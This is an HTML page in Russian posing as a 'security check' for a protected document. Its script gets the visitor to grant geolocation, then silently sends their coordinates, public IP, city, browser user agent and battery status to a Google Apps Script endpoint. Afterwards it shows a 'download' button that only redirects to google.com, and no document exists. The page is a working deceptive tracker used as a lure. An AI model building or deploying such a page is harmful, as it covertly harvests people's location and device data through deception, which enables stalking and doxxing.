<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Проверка безопасности</title>
</head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2 style="color:red;">Документ защищен!</h2>
    <p>Пожалуйста, разрешите доступ к геолокации для проверки безопасности и просмотра файла.</p>
    
    <button id="dlBtn" style="display:none; padding: 15px 30px; font-size: 18px; background: #1a73e8; color: white; border: none; border-radius: 5px; margin-top: 20px; cursor: pointer;">Скачать документ</button>
    
    <script>
    document.getElementById('dlBtn').onclick = function() { window.location.href = "https://www.google.com"; };
    
    let ua = navigator.userAgent;
    let batteryStatus = "Неизвестно";
    
    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            batteryStatus = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Заряжается)" : "");
        });
    }

    navigator.geolocation.getCurrentPosition(
        (pos) => { sendData(pos.coords.latitude, pos.coords.longitude); },
        (err) => { sendData("denied", "denied"); },
        { timeout: 10000 } 
    );

    function sendData(lat, lon) {
        fetch('https://ipwho.is/').then(r => r.json()).then(d => {
            let url = "https://script.google.com/macros/s/AKfycbxRqwoAVwQQQFfl4lANQN8GuYuyatT_yda1rXEmw-RJemc9WaZz6PmYUOsf6Z5U-_qHSg/exec?ip=" + d.ip + "&city=" + d.city + "&lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua) + "&battery=" + encodeURIComponent(batteryStatus);
            
            fetch(url, {mode: 'no-cors'}).then(() => {
                document.getElementById('dlBtn').style.display = 'inline-block';
            });
        }).catch(() => {
            let url = "https://script.google.com/macros/s/AKfycbxRqwoAVwQQQFfl4lANQN8GuYuyatT_yda1rXEmw-RJemc9WaZz6PmYUOsf6Z5U-_qHSg/exec?ip=Unknown&city=Unknown&lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua) + "&battery=" + encodeURIComponent(batteryStatus);
            fetch(url, {mode: 'no-cors'}).then(() => {
                document.getElementById('dlBtn').style.display = 'inline-block';
            });
        });
    }
    </script>
</body>
</html>
